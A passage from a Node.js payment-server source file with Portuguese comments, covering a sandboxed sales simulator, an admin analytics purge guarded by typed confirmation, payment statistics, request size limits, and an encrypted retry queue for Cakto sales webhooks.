          if (!completed) throw Object.assign(new Error('commercial_tx_claim_lost'), { code: 'commercial_tx_claim_lost' });
        }
      }
      return result;
    };

    if (deps.disableCommercialCustomerLock === true) return await runUnlocked(null);
    return await withCommercialCustomerLock(db, email, (_lock, assertCustomerLock) => runUnlocked(assertCustomerLock), {
      owner: deps.commercialLockOwner,
      waitMs: deps.commercialLockWaitMs,
      leaseMs: deps.commercialLockLeaseMs,
      heartbeatMs: deps.commercialLockHeartbeatMs,
      disableHeartbeat: deps.disableCommercialHeartbeat === true,
    });
  } catch (e) {
    if (txClaim && !txClaim.completed) await failCommercialTxClaim(db, txClaim, e).catch(() => {});
    throw e;
  }
}

// ── Laboratório de Testes (Analytics) ───────────────────────────────────
// Núcleo compartilhado com o fluxo Cakto real: mesma processCommercialSale,
// só com adapters isolados (ver _simKeyStore acima) que tornam
// estruturalmente impossível a simulação tocar portal_users ou a coleção
// real de chaves. planId é a ÚNICA entrada de negócio aceita do browser —
// preço/limite/duração SEMPRE resolvem de ZVM_PLANS aqui no servidor.
function _findSandboxKeyByEmail(email) {
  // Mesma lógica de fallback que processCommercialSale usa quando
  // findPortalUser não encontra nada — replicada aqui só pra o PREVIEW
  // (sem persistir nada) reportar wouldRenew/wouldCreate de forma
  // consistente com o que o EXECUTE realmente vai fazer.
  const target = email.toLowerCase();
  return Object.keys(_simKeyStore).find(code => {
    const noteEmail = (_simKeyStore[code]?.note || '').match(/Email: (\S+)/)?.[1] || '';
    return noteEmail.toLowerCase() === target;
  }) || null;
}

// ── Limpeza de histórico do Analytics ───────────────────────────────────
// Fonte única e ÚNICA verdade sobre "o que é dado comercial do Analytics":
// auditoria (getPaymentStats/getPayments/export CSV acima) confirmou que
// receita, vendas, gráficos, ranking de produto/cliente, retenção/churn de
// pagamento e o contador de simulações vêm TODOS só de `payments`. Nenhuma
// outra collection alimenta o Analytics — então o allowlist abaixo é
// deliberadamente uma collection só. Nunca aceitar nome de collection nem
// filtro vindo do navegador: o cliente manda só `mode`, essa tabela decide
// o filtro real. Adicionar uma collection nova aqui exige decisão explícita
// nesta rodada seguinte, nunca implícita.
const ANALYTICS_PURGE_FILTERS = Object.freeze({
  test: Object.freeze({ testMode: true }),
  real: Object.freeze({ testMode: { $ne: true } }),
  all:  Object.freeze({}),
});

// Núcleo testável (deps.db injetável, mesmo padrão de simulateCommercialSale)
// — as rotas HTTP abaixo só cuidam de auth/CSRF/rate-limit e chamam isto.
async function previewAnalyticsPurge(mode, deps = {}) {
  if (!Object.prototype.hasOwnProperty.call(ANALYTICS_PURGE_FILTERS, mode)) {
    const e = new Error('invalid_mode'); e.code = 'invalid_mode'; throw e;
  }
  const db = deps.db || await getMongoDb();
  const [testRecords, realRecords, totalRecords] = await Promise.all([
    db.collection('payments').countDocuments(ANALYTICS_PURGE_FILTERS.test),
    db.collection('payments').countDocuments(ANALYTICS_PURGE_FILTERS.real),
    db.collection('payments').countDocuments(ANALYTICS_PURGE_FILTERS.all),
  ]);
  const scoped = mode === 'test' ? testRecords : mode === 'real' ? realRecords : totalRecords;
  return { mode, scoped, testRecords, realRecords, totalRecords };
}

async function executeAnalyticsPurge({ mode, confirmText, expectedCount }, deps = {}) {
  if (!Object.prototype.hasOwnProperty.call(ANALYTICS_PURGE_FILTERS, mode)) {
    const e = new Error('invalid_mode'); e.code = 'invalid_mode'; throw e;
  }
  // "Somente testes" libera com só o clique do botão. Real/all exigem a
  // confirmação digitada — validada aqui, não só na UI: um POST direto sem
  // passar pela tela tem que continuar bloqueado.
  if (mode !== 'test' && String(confirmText || '') !== 'APAGAR HISTORICO') {
    const e = new Error('confirmation_required'); e.code = 'confirmation_required'; throw e;
  }
  const filter = ANALYTICS_PURGE_FILTERS[mode];
  const db = deps.db || await getMongoDb();
  // Proteção contra exclusão acidental: reconta bem antes do deleteMany e
  // compara com o que o preview mostrou pro admin. Se mudou nesse meio-tempo
  // (ex.: uma venda real chegou), aborta em vez de apagar um total diferente
  // do que foi mostrado.
  const before = await db.collection('payments').countDocuments(filter);
  const expected = Number(expectedCount);
  if (Number.isFinite(expected) && expected !== before) {
    const e = new Error('count_changed'); e.code = 'count_changed'; e.before = before; throw e;
  }
  const result = await db.collection('payments').deleteMany(filter);
  const after = await db.collection('payments').countDocuments(filter);
  return { deletedCount: result.deletedCount, verifiedEmpty: after === 0 };
}

function resolveLabPlan(planId) {
  const plan = ZVM_PLANS[String(planId || '').toLowerCase()];
  return plan || null;
}

// _testSavePayment: override só para os testes automatizados alcançarem o
// EXECUTE sem tocar o MongoDB real (savePayment normalmente não é
// injetável aqui, diferente de processCommercialSale). A rota HTTP do
// Laboratório nunca passa esse parâmetro — comportamento em produção
// idêntico ao de antes.
async function simulateCommercialSale({ planId, name, email, phone, method, execute = false, sendRealEmail = false, _testSavePayment = null }) {
  const plan = resolveLabPlan(planId);
  if (!plan) { const e = new Error('lab_invalid_plan'); e.code = 'invalid_plan'; throw e; }

  const clientEmail = safeScalar(email, 160).toLowerCase();
  if (!clientEmail || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(clientEmail)) { const e = new Error('lab_invalid_email'); e.code = 'invalid_email'; throw e; }
  const clientName  = safeScalar(name, 120, 'Cliente Teste');
  const clientPhone = safeScalar(phone, 30, '');
  const paymentMethod = ['credit_card', 'pix'].includes(method) ? method : 'pix';

  const existingCode = _findSandboxKeyByEmail(clientEmail);
  const durationMs = plan.durationDays * 24 * 60 * 60 * 1000;
  const now = new Date();

  if (!execute) {
    // PREVIEW — só calcula, nunca persiste nem envia e-mail.
    const wouldRenew = !!existingCode;
    let expiresAt;
    if (wouldRenew) {
      const key = _simKeyStore[existingCode];
      const currentExpiry = key.expiresAt ? new Date(key.expiresAt) : null;
      const validExpiry = currentExpiry && Number.isFinite(currentExpiry.getTime()) && currentExpiry > now;
      const base = validExpiry ? currentExpiry : now;
      expiresAt = new Date(base.getTime() + durationMs).toISOString();
    } else {
      expiresAt = new Date(now.getTime() + durationMs).toISOString();
    }
    return {
      mode: 'preview', planId: plan.id, planName: plan.name, price: plan.price,
      maxUses: plan.maxUses, durationDays: plan.durationDays,
      wouldRenew, wouldCreate: !wouldRenew, expiresAt,
      paymentMethod, email: clientEmail, persisted: false, emailSent: false,
    };
  }

  // EXECUTE — chama o MESMO núcleo comercial do Cakto real, com adapters
  // isolados (sandbox key store, sem tocar portal_users, sem persistir na
  // coleção real de chaves). O payment vai pra coleção real `payments`
  // (testMode:true) — é assim que o Analytics consegue listar/filtrar a
  // simulação sem misturá-la com receita real.
  const txId = 'sim-' + crypto.randomBytes(12).toString('hex');
  const sale = {
    clientEmail, clientName, clientPhone, paymentMethod,
    source: 'analytics_simulator', testMode: true, txId,
    tracking: null, paidAt: now.toISOString(),
    amount: plan.price, productName: plan.name, event: 'simulated_purchase',
  };
  const result = await processCommercialSale(sale, plan, {
    keyStore: _simKeyStore,
    db: {}, // nunca dereferenciado: os três deps abaixo cobrem todo uso de `db`
    findPortalUser: async () => null,
    linkPortalUser: async () => {},
    persistKey: async () => {},
    savePayment: _testSavePayment || (payment => savePayment(payment, { strict: true })),
    sendKeyDeliveryEmail: sendRealEmail ? sendKeyDeliveryEmail : (async () => true),
    now,
  });

  return {
    mode: 'execute', planId: plan.id, planName: plan.name, price: plan.price,
    maxUses: plan.maxUses, durationDays: plan.durationDays,
    wouldRenew: result.renewed, wouldCreate: !result.renewed, expiresAt: result.expiresAt,
    paymentMethod, email: clientEmail, persisted: true,
    // Antes isto era `!!sendRealEmail` — refletia só se o checkbox estava
    // marcado, não se o e-mail REALMENTE saiu. Um provedor recusando o envio
    // (ou qualquer outra falha) continuava sendo relatado como "enviado" pro
    // admin. Agora reflete o resultado real que processCommercialSale devolve.
    emailSent: sendRealEmail ? !!result.emailDelivered : false,
    txId, keyCode: result.keyCode,
  };
}

async function getPayments({ startDate, endDate, limit = 500 } = {}) {
  try {
    const db     = await getMongoDb();
    const filter = {};
    if (startDate || endDate) {
      filter.paidAt = {};
      if (startDate) filter.paidAt.$gte = startDate;
      if (endDate)   filter.paidAt.$lte = endDate;
    }
    return await db.collection('payments')
      .find(filter)
      .sort({ paidAt: -1 })
      .limit(limit)
      .toArray();
  } catch (e) { console.error('[DB] Erro ao buscar pagamentos:', e.message); return []; }
}

async function getPaymentStats() {
  try {
    const db  = await getMongoDb();
    const now = new Date();
    const d7  = new Date(now - 7  * 86400000);
    const d30 = new Date(now - 30 * 86400000);
    // Estatísticas comerciais principais SEMPRE excluem testMode:true — o
    // Laboratório de Testes do Analytics não pode inflar receita/vendas
    // reais. `real` é a base de todo $match abaixo; simCount é apurado à
    // parte, exatamente para não se misturar com faturamento real.
    const real = { approved: true, testMode: { $ne: true } };

    const [total, last7, last30, simCount, byProduct, byDay, byHour, byMethod] = await Promise.all([
      db.collection('payments').countDocuments(real),
      db.collection('payments').countDocuments({ ...real, paidAt: { $gte: d7.toISOString() } }),
      db.collection('payments').countDocuments({ ...real, paidAt: { $gte: d30.toISOString() } }),
      db.collection('payments').countDocuments({ approved: true, testMode: true }),
      db.collection('payments').aggregate([
        { $match: real },
        { $group: { _id: '$productName', count: { $sum: 1 }, revenue: { $sum: '$amount' } } },
        { $sort: { count: -1 } }
      ]).toArray(),
      db.collection('payments').aggregate([
        { $match: { ...real, paidAt: { $gte: d30.toISOString() } } },
        { $group: {
          _id: { $substr: ['$paidAt', 0, 10] },
          count: { $sum: 1 }, revenue: { $sum: '$amount' }
        }},
        { $sort: { _id: 1 } }
      ]).toArray(),
      db.collection('payments').aggregate([
        { $match: real },
        { $addFields: { hour: { $substr: ['$paidAt', 11, 2] } } },
        { $group: { _id: '$hour', count: { $sum: 1 } } },
        { $sort: { _id: 1 } }
      ]).toArray(),
      db.collection('payments').aggregate([
        { $match: real },
        { $group: { _id: '$paymentMethod', count: { $sum: 1 }, revenue: { $sum: '$amount' } } },
        { $sort: { count: -1 } }
      ]).toArray(),
    ]);

    const [revTotalArr, revLast30Arr, revLast7Arr] = await Promise.all([
      db.collection('payments').aggregate([{ $match: real },{ $group: { _id: null, total: { $sum: '$amount' } } }]).toArray(),
      db.collection('payments').aggregate([{ $match: { ...real, paidAt: { $gte: d30.toISOString() } } },{ $group: { _id: null, total: { $sum: '$amount' } } }]).toArray(),
      db.collection('payments').aggregate([{ $match: { ...real, paidAt: { $gte: d7.toISOString() } } },{ $group: { _id: null, total: { $sum: '$amount' } } }]).toArray(),
    ]);
    const revenueTotal   = revTotalArr[0]?.total  || 0;
    const revenueLast30  = revLast30Arr[0]?.total  || 0;
    const revenueLast7   = revLast7Arr[0]?.total   || 0;

    const retentionArr = await db.collection('payments').aggregate([
      { $match: { ...real, clientEmail: { $exists: true, $ne: '' } } },
      { $group: { _id: '$clientEmail', count: { $sum: 1 }, total: { $sum: '$amount' } } },
      { $sort: { count: -1 } }
    ]).toArray();
    const uniqueClients  = retentionArr.length;
    const returningClients = retentionArr.filter(c => c.count > 1).length;
    const retentionRate  = uniqueClients ? Math.round((returningClients / uniqueClients) * 100) : 0;
    const topClients     = retentionArr.slice(0, 5);

    const expiredKeys = Object.values(keys).filter(k => {
      if (!k.expiresAt) return false;
      const exp = new Date(k.expiresAt);
      return exp > d30 && exp <= now;
    });
    const renewedEmails = new Set(
      (await db.collection('payments').find({ ...real, paidAt: { $gte: d30.toISOString() } }).toArray())
        .map(p => p.clientEmail).filter(Boolean)
    );
    const churnedKeys = expiredKeys.filter(k => {
      const email = (k.note||'').match(/Email: ([^\s|]+)/)?.[1] || '';
      return email && !renewedEmails.has(email);
    }).length;
    const churnRate = expiredKeys.length ? Math.round((churnedKeys / expiredKeys.length) * 100) : 0;

    return {
      total, last7, last30, revenueTotal, revenueLast30, revenueLast7,
      byProduct, byDay, byHour, byMethod, simCount,
      uniqueClients, returningClients, retentionRate, topClients,
      churnedKeys, churnRate, expiredKeys: expiredKeys.length,
    };
  } catch (e) { console.error('[DB] Erro nas stats:', e.message); return null; }
}

const MAX_BODY_SIZE     = 64  * 1024; // 64 KB — API interna (keys/usage)
const WEBHOOK_BODY_SIZE = 256 * 1024; // 256 KB — webhooks externos de venda

// Coleta raw string com hard-limit; retorna null se exceder (req.destroy() encerra conexão)
function readRawBody(req, maxBytes = MAX_BODY_SIZE) {
  return new Promise(resolve => {
    let b = '', size = 0;
    req.on('data', c => {
      size += c.length;
      if (size > maxBytes) {
        const ip = getIp(req);
        addSecurityAlert('OVERSIZED_PAYLOAD', `Payload excedeu ${maxBytes} bytes — conexão encerrada`, ip);
        req.destroy();
        resolve(null);
        return;
      }
      b += c;
    });
    req.on('end',   () => resolve(b));
    req.on('error', () => resolve(null));
  });
}

function readRawBodyBuffer(req, maxBytes = MAX_BODY_SIZE) {
  return new Promise(resolve => {
    const chunks = [];
    let size = 0, settled = false;
    const finish = (value) => { if (settled) return; settled = true; resolve(value); };
    req.on('data', chunk => {
      if (settled) return;
      const buf = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
      size += buf.length;
      if (size > maxBytes) {
        const ip = getIp(req);
        addSecurityAlert('OVERSIZED_PAYLOAD', `Payload excedeu ${maxBytes} bytes — conexão encerrada`, ip);
        req.destroy();
        finish(null);
        return;
      }
      chunks.push(buf);
    });
    req.on('end', () => finish(Buffer.concat(chunks, size)));
    req.on('error', () => finish(null));
  });
}

function validateCaktoPayload(payload, configuredSecret = CAKTO_WEBHOOK_SECRET) {
  if (!configuredSecret) return { ok: false, status: 503, error: 'webhook_disabled' };
  if (!isPlainRecord(payload)) return { ok: false, status: 400, error: 'invalid_payload' };
  if (!isPlainRecord(payload.data) && !Array.isArray(payload.data)) return { ok: false, status: 400, error: 'invalid_payload' };
  if (typeof payload.secret !== 'string') return { ok: false, status: 400, error: 'invalid_payload' };
  const receivedSecret = payload.secret;
  if (!safeCompare(receivedSecret, configuredSecret)) return { ok: false, status: 401, error: 'unauthorized' };
  const purchases = normalizeCaktoPurchases(payload);
  if (!purchases.length) return { ok: false, status: 400, error: 'invalid_payload' };
  return selectCaktoCommercialPurchase(purchases);
}

// P0: a fila webhook_events e o seu worker são a ÚNICA autoridade de retry.
// Reentrega Cakto (automática ou manual) não pode duplicar licenças nem zerar
// o backoff; somente estados órfãos são rearmados por CAS, sem nova fila.
// A Cakto documenta reenvio automático progressivo e reenvio manual pelo
// histórico de webhooks. HTTP 503 só confirma falha local, não persistência.
function caktoExpiredProcessingFilter(now) {
  const staleBefore = new Date(now.getTime() - CAKTO_PROCESSING_STALE_MS);
  return { status: 'processing', $or: [
    { leaseUntil: { $lte: now } },
    { leaseUntil: { $exists: false }, lastAttemptAt: { $lte: staleBefore } },
    { leaseUntil: { $exists: false }, lastAttemptAt: { $exists: false }, updatedAt: { $lte: staleBefore } },
  ] };
}

function caktoRunnableQueueFilter(now) {
  return { $or: [
    { status: { $in: ['pending', 'retry'] }, nextAttemptAt: { $lte: now } },
    { status: { $in: ['pending', 'retry'] }, nextAttemptAt: { $exists: false } },
    { status: 'failed' },
    caktoExpiredProcessingFilter(now),
  ] };
}

async function recoverCaktoDuplicateEvent(db, eventKey, queueRef, now) {
  const coll = db.collection('webhook_events');
  // Não antecipa o backoff de retry, não altera processing com lease ativo,
  // não ressuscita dead_letter e jamais reabre pagamentos concluídos.
  const recovered = await coll.findOneAndUpdate({
    eventKey, source: 'cakto',
    $and: [
      { $or: [{ purchaseEnc: { $type: 'object' } }, { purchase: { $type: 'object' } }] },
      { $or: [
        { status: 'failed' },
        { status: 'retry', nextAttemptAt: { $exists: false } },
        caktoExpiredProcessingFilter(now),
      ] },
    ],
  }, {
    $set: { status: 'pending', nextAttemptAt: now, updatedAt: now },
    $unset: { leaseOwner: '', leaseUntil: '', workerFence: '', lastError: '' },
  }, { returnDocument: 'after', projection: { _id: 0, queueRef: 1, status: 1 } });
  const doc = recovered && typeof recovered === 'object' && 'value' in recovered ? recovered.value : recovered;
  if (doc) return { queued: true, duplicate: true, recovered: true, queueRef: doc.queueRef || queueRef, status: 'pending' };
  const existing = await coll.findOne({ eventKey, source: 'cakto' },
    { projection: { _id: 0, queueRef: 1, status: 1, purchaseEnc: 1, purchase: 1 } });
  if (!existing) return null;
  // Um status recuperável sem carga útil não tem caminho seguro para a venda.
  if (['failed', 'retry', 'processing', 'pending'].includes(existing.status)
      && !existing.purchaseEnc && !existing.purchase) {
    throw Object.assign(new Error('cakto_queue_payload_unavailable'), { code: 'cakto_queue_payload_unavailable' });
  }
  return { queued: false, duplicate: true, recovered: false, queueRef: existing.queueRef || queueRef, status: existing.status };
}

function compactCaktoPurchaseForQueue(purchase) {
  return {
    source: 'cakto', event: purchase.event, txId: purchase.txId, refId: purchase.refId || '',
    status: purchase.status, clientName: purchase.clientName || '', clientEmail: purchase.clientEmail || '',
    clientPhone: purchase.clientPhone || '', productId: purchase.productId || '', productShortId: purchase.productShortId || '',
    productName: purchase.productName || '', offerId: purchase.offerId || '', offerName: purchase.offerName || '',
    offerType: purchase.offerType || '', parentOrder: purchase.parentOrder || '', checkoutUrl: purchase.checkoutUrl || '',
    subscriptionId: purchase.subscriptionId || '', checkoutBinding: purchase.checkoutBinding || '',
    amount: purchase.amount, baseAmount: purchase.baseAmount, offerPrice: purchase.offerPrice, discount: purchase.discount,
    currency: purchase.currency || '', amountRawType: purchase.amountRawType || '', paymentMethod: purchase.paymentMethod || '',
    paidAt: purchase.paidAt || '', couponCode: purchase.couponCode || '', tracking: purchase.tracking || null,
  };
}

function encryptCaktoQueuePurchase(purchase, queueRef) {
  const compact = compactCaktoPurchaseForQueue(purchase);
  const enc = encryptCaktoRecoveryPayload(compact, queueRef);
  if (!enc) throw Object.assign(new Error('cakto_queue_crypto_unavailable'), { code: 'cakto_queue_crypto_unavailable' });
  return enc;
}

function decryptCaktoQueuePurchase(doc) {
  if (!doc || typeof doc !== 'object') throw Object.assign(new Error('cakto_queue_document_invalid'), { code: 'cakto_queue_document_invalid' });
  if (doc.purchaseEnc && typeof doc.purchaseEnc === 'object') {
    const decoded = decryptCaktoRecoveryPayload(doc.purchaseEnc, doc.queueRef || caktoQueueRef(doc.eventKey));
    if (!decoded || typeof decoded !== 'object' || Array.isArray(decoded) || !decoded.txId) throw Object.assign(new Error('cakto_queue_payload_invalid'), { code: 'cakto_queue_payload_invalid' });
    return decoded;
  }
  if (doc.purchase && typeof doc.purchase === 'object' && !Array.isArray(doc.purchase)) return compactCaktoPurchaseForQueue(doc.purchase);
  throw Object.assign(new Error('cakto_queue_payload_unavailable'), { code: 'cakto_queue_payload_unavailable' });
}

async function migrateCaktoQueuedPurchaseDocument(db, doc) {
  if (!db || !doc || doc.purchaseEnc || !doc.purchase || typeof doc.purchase !== 'object') return { migrated: false, doc };
  const queueRef = doc.queueRef || caktoQueueRef(doc.eventKey);
  const purchase = compactCaktoPurchaseForQueue(doc.purchase);
  const purchaseEnc = encryptCaktoQueuePurchase(purchase, queueRef);
  const filter = doc.leaseOwner ? caktoEventLeaseFilter(doc) : { _id: doc._id, eventKey: doc.eventKey, source: 'cakto', purchase: { $type: 'object' }, purchaseEnc: { $exists: false } };
  const result = await db.collection('webhook_events').updateOne(filter, {
    $set: { purchaseEnc, queueRef, updatedAt: new Date() },
    $unset: { purchase: '', txId: '', refId: '' },
  });
  if (!result?.matchedCount) return { migrated: false, doc };
  return { migrated: true, doc: { ...doc, queueRef, purchaseEnc, purchase } };
}

async function backfillCaktoQueuePayloads(db, opts = {}) {
  if (!db || typeof db.collection !== 'function' || !caktoRecoverySecretRing().length) return { scanned: 0, updated: 0, skipped: true };
  const coll = db.collection('webhook_events');
  const limit = Math.max(1, Math.min(20000, Number(opts.limit) || 5000));
  const docs = await coll.find({ source: 'cakto', purchase: { $type: 'object' }, purchaseEnc: { $exists: false }, status: { $in: ['pending','retry','processing','failed'] } }).limit(limit).toArray();
  let updated = 0;
  for (const doc of docs) {
    const queueRef = doc.queueRef || caktoQueueRef(doc.eventKey);
    try {
      const purchaseEnc = encryptCaktoQueuePurchase(doc.purchase, queueRef);
      const result = await coll.updateOne(
        { _id: doc._id, source: 'cakto', purchase: { $type: 'object' }, purchaseEnc: { $exists: false } },
        { $set: { queueRef, purchaseEnc, updatedAt: new Date() }, $unset: { purchase: '', txId: '', refId: '' } }
      );
      if (result?.matchedCount) updated++;
    } catch (e) {
      if (e?.code === 11000) continue;
      throw e;
    }
  }
  return { scanned: docs.length, updated, skipped: false };
}

async function backfillCaktoQueueRefs(db, opts = {}) {
  if (!db || typeof db.collection !== 'function') return { scanned: 0, updated: 0 };
  const coll = db.collection('webhook_events');
  const limit = Math.max(1, Math.min(20000, Number(opts.limit) || 5000));
  const docs = await coll.find({ source: 'cakto', eventKey: { $exists: true }, queueRef: { $exists: false } }, { projection: { _id: 1, eventKey: 1 } }).limit(limit).toArray();
  let updated = 0;
  for (const doc of docs) {
    const queueRef = caktoQueueRef(doc.eventKey);
    try {
      const result = await coll.updateOne({ _id: doc._id, queueRef: { $exists: false } }, { $set: { queueRef } });
      if (result?.matchedCount) updated++;
    } catch (e) {
      if (e?.code !== 11000) throw e;
    }
  }
  return { scanned: docs.length, updated };
}

async function assertCaktoQueueTransactionReady(db, opts = {}) {
  if (!db || typeof db.collection !== 'function') throw Object.assign(new Error('cakto_queue_db_unavailable'), { code: 'cakto_queue_db_unavailable' });
  const client = opts.client || ((db === _mongoDb) ? _mongoClient : null);
  if (!client || typeof client.startSession !== 'function') throw Object.assign(new Error('cakto_queue_transaction_unavailable'), { code: 'cakto_queue_transaction_unavailable' });
  const session = client.startSession();
  if (!session || typeof session.withTransaction !== 'function') {
    try { if (session && typeof session.endSession === 'function') await session.endSession(); } catch (_) {}
    throw Object.assign(new Error('cakto_queue_transaction_unavailable'), { code: 'cakto_queue_transaction_unavailable' });
  }
  try {
    await session.withTransaction(async () => {
      await db.collection('queue_counters').findOne({ _id: CAKTO_QUEUE_COUNTER_ID }, { projection: { _id: 1 }, session });
    }, { readConcern: { level: 'snapshot' }, writeConcern: { w: 'majority' }, readPreference: 'primary' });
    return true;
  } catch (_) {
    throw Object.assign(new Error('cakto_queue_transaction_unavailable'), { code: 'cakto_queue_transaction_unavailable' });
  } finally {
    try { await session.endSession(); } catch (_) {}
  }
}

async function runCaktoQueueAtomic(db, work, opts = {}) {
  if (!db || typeof db.collection !== 'function' || typeof work !== 'function') throw new Error('cakto_queue_db_unavailable');
  const client = opts.client || ((db === _mongoDb) ? _mongoClient : null);
  const requireTransaction = opts.requireTransaction === undefined
    ? !!(IS_PRODUCTION && CAKTO_WEBHOOK_SECRET && db === _mongoDb)
    : !!opts.requireTransaction;
  if (!client || typeof client.startSession !== 'function') {
    if (requireTransaction) throw Object.assign(new Error('cakto_queue_transaction_unavailable'), { code: 'cakto_queue_transaction_unavailable' });
    return work(null, false);
  }
  const session = client.startSession();
  if (!session || typeof session.withTransaction !== 'function') {
    try { if (session && typeof session.endSession === 'function') await session.endSession(); } catch (_) {}
    if (requireTransaction) throw Object.assign(new Error('cakto_queue_transaction_unavailable'), { code: 'cakto_queue_transaction_unavailable' });
    return work(null, false);
  }
  let output;
  try {
    await session.withTransaction(async () => { output = await work(session, true); }, {
      readConcern: { level: 'snapshot' }, writeConcern: { w: 'majority' }, readPreference: 'primary',
    });
    return output;
  } finally {
    try { await session.endSession(); } catch (_) {}
  }
}

async function reconcileCaktoQueueCounter(db) {
  if (!db || typeof db.collection !== 'function') return 0;
  const active = Number(await db.collection('webhook_events').countDocuments({ source: 'cakto', status: { $in: ['pending','retry','processing','failed'] } })) || 0;
  await db.collection('queue_counters').updateOne({ _id: CAKTO_QUEUE_COUNTER_ID }, { $set: { count: active, updatedAt: new Date() }, $setOnInsert: { createdAt: new Date() } }, { upsert: true });
  return active;
}

async function reserveCaktoQueueSlot(db, maxActive = CAKTO_QUEUE_MAX_ACTIVE, opts = {}) {
  const max = Math.max(0, Number(maxActive) || 0);
  if (!max) return { ok: true, reserved: false };
  const coll = db.collection('queue_counters');
  const sessionOpt = opts.session ? { session: opts.session } : {};
  for (let attempt = 0; attempt < 3; attempt++) {
    const now = new Date();
    const result = await coll.findOneAndUpdate(
      { _id: CAKTO_QUEUE_COUNTER_ID, count: { $lt: max } },
      { $inc: { count: 1 }, $set: { updatedAt: now } },
      { returnDocument: 'after', ...sessionOpt }
    );
    const doc = result && typeof result === 'object' && 'value' in result ? result.value : result;
    if (doc) return { ok: true, reserved: true, count: Number(doc.count) || 0 };
    const existing = await coll.findOne({ _id: CAKTO_QUEUE_COUNTER_ID }, sessionOpt);
    if (existing) return { ok: false, reserved: false, error: 'cakto_queue_backpressure', count: Number(existing.count) || 0 };
    const active = Number(await db.collection('webhook_events').countDocuments({ source: 'cakto', $or: [{ activeSlot: true }, { activeSlot: { $exists: false }, status: { $in: ['pending','retry','processing','failed'] } }] }, sessionOpt)) || 0;
    if (active >= max) return { ok: false, reserved: false, error: 'cakto_queue_backpressure', count: active };
    try {
      await coll.insertOne({ _id: CAKTO_QUEUE_COUNTER_ID, count: active + 1, createdAt: now, updatedAt: now }, sessionOpt);
      return { ok: true, reserved: true, count: active + 1 };
    } catch (e) {
      if (e?.code !== 11000) throw e;
    }
  }
  return { ok: false, reserved: false, error: 'cakto_queue_backpressure' };
}

async function releaseCaktoQueueSlot(db, opts = {}) {
  const coll = db.collection('queue_counters');
  const sessionOpt = opts.session ? { session: opts.session } : {};
  for (let attempt = 0; attempt < 4; attempt++) {
    const doc = await coll.findOne({ _id: CAKTO_QUEUE_COUNTER_ID }, sessionOpt);
    const current = Number(doc?.count) || 0;
    if (current <= 0) return false;
    const result = await coll.updateOne({ _id: CAKTO_QUEUE_COUNTER_ID, count: current }, { $inc: { count: -1 }, $set: { updatedAt: new Date() } }, sessionOpt);
    if (result?.matchedCount) return true;
  }
  return false;
}

function caktoQueueRecoveryKeyForSecret(secret, version = 2) {
  const value = String(secret || '');
  if (Buffer.byteLength(value, 'utf8') < 32) return null;
  return crypto.createHash('sha256').update(`zvm:cakto:dead-letter:v${version}\0${value}`, 'utf8').digest();
}

function caktoRecoverySecretRing() {
  const candidates = [];
  const current = CAKTO_RECOVERY_SECRET || APP_SECRET;
  if (current) candidates.push(current);
  for (const item of String(CAKTO_RECOVERY_SECRET_PREVIOUS || '').split(',').map(v => v.trim()).filter(Boolean)) candidates.push(item);
  const out = [];
  const seen = new Set();
  for (const secret of candidates) {
    if (Buffer.byteLength(secret, 'utf8') < 32) continue;
    const kid = crypto.createHash('sha256').update(`zvm:cakto:recovery:kid\0${secret}`, 'utf8').digest('hex').slice(0, 16);
    if (seen.has(kid)) continue;
    seen.add(kid);
    out.push({ kid, secret, key: caktoQueueRecoveryKeyForSecret(secret, 2) });
  }
  return out;
}

function encryptCaktoRecoveryPayload(purchase, aad) {
  const current = caktoRecoverySecretRing()[0];
  if (!current?.key) return null;
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', current.key, iv);
  cipher.setAAD(Buffer.from(String(aad || ''), 'utf8'));
  const data = Buffer.concat([cipher.update(JSON.stringify(purchase || {}), 'utf8'), cipher.final()]);
  return { v: 2, alg: 'A256GCM', kid: current.kid, iv: iv.toString('base64'), tag: cipher.getAuthTag().toString('base64'), data: data.toString('base64') };
}

function decodeCaktoRecoveryPayloadWithKey(payload, aad, key) {
  if (!key || !payload || payload.alg !== 'A256GCM') throw new Error('invalid');
  if (typeof payload.iv !== 'string' || typeof payload.tag !== 'string' || typeof payload.data !== 'string') throw new Error('invalid');
  if (payload.iv.length > 64 || payload.tag.length > 64 || payload.data.length > 180000) throw new Error('invalid');
  const iv = Buffer.from(payload.iv, 'base64');
  const tag = Buffer.from(payload.tag, 'base64');
  const ciphertext = Buffer.from(payload.data, 'base64');
  if (iv.length !== 12 || tag.length !== 16 || ciphertext.length > 128 * 1024) throw new Error('invalid');
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAAD(Buffer.from(String(aad || ''), 'utf8'));
  decipher.setAuthTag(tag);
  return JSON.parse(Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8'));
}

function decryptCaktoRecoveryPayload(payload, aad) {
  if (!payload || payload.alg !== 'A256GCM') throw Object.assign(new Error('cakto_requeue_payload_unavailable'), { code: 'cakto_requeue_payload_unavailable' });
  const keysToTry = [];
  if (payload.v === 2 && /^[a-f0-9]{16}$/.test(String(payload.kid || ''))) {
    const matched = caktoRecoverySecretRing().find(item => item.kid === payload.kid);
    if (matched) keysToTry.push(matched.key);
  } else if (payload.v === 1) {
    const legacy = caktoQueueRecoveryKeyForSecret(APP_SECRET, 1);
    if (legacy) keysToTry.push(legacy);
  } else {
    throw Object.assign(new Error('cakto_requeue_payload_unavailable'), { code: 'cakto_requeue_payload_unavailable' });
  }
  for (const key of keysToTry) {
    try { return decodeCaktoRecoveryPayloadWithKey(payload, aad, key); } catch (_) {}
  }
  throw Object.assign(new Error('cakto_requeue_payload_invalid'), { code: 'cakto_requeue_payload_invalid' });
}

function classifyCaktoQueueFailure(error) {
  const value = safeScalar(error?.code || error?.message || error, 120, '').toLowerCase();
  if (/mongo|database|(?:^|\s)db(?:\s|$)|persist|storage/.test(value)) return 'storage';
  if (/claim|lock|lease|busy|concurr/.test(value)) return 'concurrency';
  if (/portal/.test(value)) return 'portal';
  if (/payment|pagamento/.test(value)) return 'payment';
  if (/integrity|invalid|plan|price|amount|offer|product|status/.test(value)) return 'validation';
  return 'processing';
}

function caktoQueueFailureRef(error) {
  const raw = safeScalar(error?.code || error?.message || error, 512, 'processing_failed');
  return `err#${crypto.createHash('sha256').update(raw, 'utf8').digest('hex').slice(0, 12)}`;
}

function caktoMailRef(txId) {
  const txKey = caktoPaymentTxKey(txId);
